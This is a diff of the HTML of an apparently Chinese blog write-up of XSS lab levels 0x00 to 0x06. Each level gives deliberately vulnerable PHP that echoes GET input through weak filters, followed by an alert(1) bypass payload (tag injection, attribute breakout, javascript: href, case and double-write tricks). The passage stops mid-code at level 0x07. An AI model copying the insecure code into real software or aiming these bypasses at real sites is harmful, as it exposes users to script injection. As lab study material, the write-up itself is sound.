@@ -216,7 +216,6 @@
   <main>
     
       
-
 <div class="container-fluid nopadding-x">
   <div class="row nomargin-x">
     <div class="d-none d-lg-block col-lg-2"></div>
@@ -237,125 +236,325 @@
 <br>
 <br>
 
-<h2 id="0x00-先热个身吧"><a href="#0x00-先热个身吧" class="headerlink" title="0x00 先热个身吧"></a>0x00 先热个身吧</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;欢迎用户:&quot;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="0x00-先热个身吧"><a href="#0x00-先热个身吧" class="headerlink" title="0x00 先热个身吧"></a>0x00 先热个身吧</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>];
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;欢迎用户:&quot;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>没有对$str进行任何过滤,echo 直接执行了JS代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">payload:<br>?name=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs html">payload:
+?name=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>
 
 <br>
 <br>
 
-<h2 id="0x01-窒息的操作"><a href="#0x01-窒息的操作" class="headerlink" title="0x01 窒息的操作"></a>0x01 窒息的操作</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level2.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="0x01-窒息的操作"><a href="#0x01-窒息的操作" class="headerlink" title="0x01 窒息的操作"></a>0x01 窒息的操作</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span>
+<span class="hljs-string">&lt;form action=level2.php method=GET&gt;</span>
+<span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;&quot;&gt;</span>
+<span class="hljs-string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span>
+<span class="hljs-string">&lt;/form&gt;</span>
+<span class="hljs-string">&lt;/center&gt;&#x27;</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>双引号闭合文本框的value,插入JS代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">payload:<br>&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs html">payload:
+&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>
 
 <br>
 <br>
 
-<h2 id="0x02-这该咋办啊"><a href="#0x02-这该咋办啊" class="headerlink" title="0x02 这该咋办啊"></a>0x02 这该咋办啊</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&quot;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level3.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&#x27;&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&#x27;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="0x02-这该咋办啊"><a href="#0x02-这该咋办啊" class="headerlink" title="0x02 这该咋办啊"></a>0x02 这该咋办啊</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&quot;&lt;center&gt;</span>
+<span class="hljs-string">&lt;form action=level3.php method=GET&gt;</span>
+<span class="hljs-string">&lt;input name=keyword  value=&#x27;&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&#x27;&gt;</span>
+<span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span>
+<span class="hljs-string">&lt;/form&gt;</span>
+<span class="hljs-string">&lt;/center&gt;&quot;</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>单引号引号闭合文本框的value,插入JS DOM事件代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">payload:<br>&#x27; onclick=alert(1) //<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs html">payload:
+&#x27; onclick=alert(1) //</code></pre></div>
 
 <br>
 <br>
 
-<h2 id="0x03-生无可恋"><a href="#0x03-生无可恋" class="headerlink" title="0x03 生无可恋"></a>0x03 生无可恋</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str2</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level4.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="0x03-生无可恋"><a href="#0x03-生无可恋" class="headerlink" title="0x03 生无可恋"></a>0x03 生无可恋</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];
+<span class="hljs-variable">$str2</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);
+<span class="hljs-variable">$str3</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span>
+<span class="hljs-string">&lt;form action=level4.php method=GET&gt;</span>
+<span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span>
+<span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span>
+<span class="hljs-string">&lt;/form&gt;</span>
+<span class="hljs-string">&lt;/center&gt;&#x27;</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>本题对$str进行了字符串过滤.将’&lt;’ , ‘&gt;’替换成空格,仍然使用0x02的payload ,只不过这题是将双引号进行闭合,再插入 JS DOM事件代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">payload:<br>&quot; onclick=alert(1) //<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs html">payload:
+&quot; onclick=alert(1) //</code></pre></div>
 
 <br>
 <br>
 
-<h2 id="0x04-没错又是搜索"><a href="#0x04-没错又是搜索" class="headerlink" title="0x04 没错又是搜索"></a>0x04 没错又是搜索</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = strtolower(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=str_replace(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=str_replace(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="0x04-没错又是搜索"><a href="#0x04-没错又是搜索" class="headerlink" title="0x04 没错又是搜索"></a>0x04 没错又是搜索</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$str</span> = strtolower(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);
+<span class="hljs-variable">$str2</span>=str_replace(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);
+<span class="hljs-variable">$str3</span>=str_replace(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span>
+<span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span>
+<span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span>
+<span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span>
+<span class="hljs-string">&lt;/form&gt;</span>
+<span class="hljs-string">&lt;/center&gt;&#x27;</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>本题对$str先进行转换小写,然后将”&lt;script”替换成”&lt;scr_ipt” , “on”替换成”o_n”,思路是将双引号和括号闭合,插入超链接a标签,利用href属性执行 JS代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">payloda:<br>&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span> //<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs html">payloda:
+&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span> //</code></pre></div>
 
 <br>
 <br>
 
-<h2 id="0x05-嗯-还是搜索"><a href="#0x05-嗯-还是搜索" class="headerlink" title="0x05 嗯 还是搜索"></a>0x05 嗯 还是搜索</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str2</span>=str_replace(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=str_replace(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=str_replace(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=str_replace(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=str_replace(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level6.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="0x05-嗯-还是搜索"><a href="#0x05-嗯-还是搜索" class="headerlink" title="0x05 嗯 还是搜索"></a>0x05 嗯 还是搜索</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];
+<span class="hljs-variable">$str2</span>=str_replace(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);
+<span class="hljs-variable">$str3</span>=str_replace(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);
+<span class="hljs-variable">$str4</span>=str_replace(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);
+<span class="hljs-variable">$str5</span>=str_replace(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);
+<span class="hljs-variable">$str6</span>=str_replace(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span>
+<span class="hljs-string">&lt;form action=level6.php method=GET&gt;</span>
+<span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span>
+<span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span>
+<span class="hljs-string">&lt;/form&gt;</span>
+<span class="hljs-string">&lt;/center&gt;&#x27;</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>本题进行诸多过滤,但是没有进行大小写限制,所以使用大写0x04的payload进行绕过</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">payloda:<br>&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">Href</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span> //<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs html">payloda:
+&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">Href</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span> //</code></pre></div>
 
 <br>
 <br>
 
-<h2 id="0x06-猜一猜下面题目还有搜索嘛"><a href="#0x06-猜一猜下面题目还有搜索嘛" class="headerlink" title="0x06 猜一猜下面题目还有搜索嘛"></a>0x06 猜一猜下面题目还有搜索嘛</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> =strtolower( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=str_replace(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=str_replace(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=str_replace(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=str_replace(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=str_replace(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level7.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="0x06-猜一猜下面题目还有搜索嘛"><a href="#0x06-猜一猜下面题目还有搜索嘛" class="headerlink" title="0x06 猜一猜下面题目还有搜索嘛"></a>0x06 猜一猜下面题目还有搜索嘛</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$str</span> =strtolower( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);
+<span class="hljs-variable">$str2</span>=str_replace(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);
+<span class="hljs-variable">$str3</span>=str_replace(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);
+<span class="hljs-variable">$str4</span>=str_replace(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str3</span>);
+<span class="hljs-variable">$str5</span>=str_replace(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str4</span>);
+<span class="hljs-variable">$str6</span>=str_replace(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str5</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span>
+<span class="hljs-string">&lt;form action=level7.php method=GET&gt;</span>
+<span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span>
+<span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span>
+<span class="hljs-string">&lt;/form&gt;</span>
+<span class="hljs-string">&lt;/center&gt;&#x27;</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>本题相对于第六题,过滤替换成空,写进行了大小写限制,但是程序只是运行一次,所以可以将标签双写进行绕过</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">payload:<br>&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">scrSCRIPTipt</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">scrSCRIPTipt</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs html">payload:
+&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">scrSCRIPTipt</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">scrSCRIPTipt</span>&gt;</span></code></pre></div>
 
 <br>
 <br>
 
-<h2 id="0X07-老铁要和我换友链嘛？"><a href="#0X07-老铁要和我换友链嘛？" class="headerlink" title="0X07 老铁要和我换友链嘛？"></a>0X07 老铁要和我换友链嘛？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>ini_set(&quot;display_errors&quot;, 0);<br>$str = 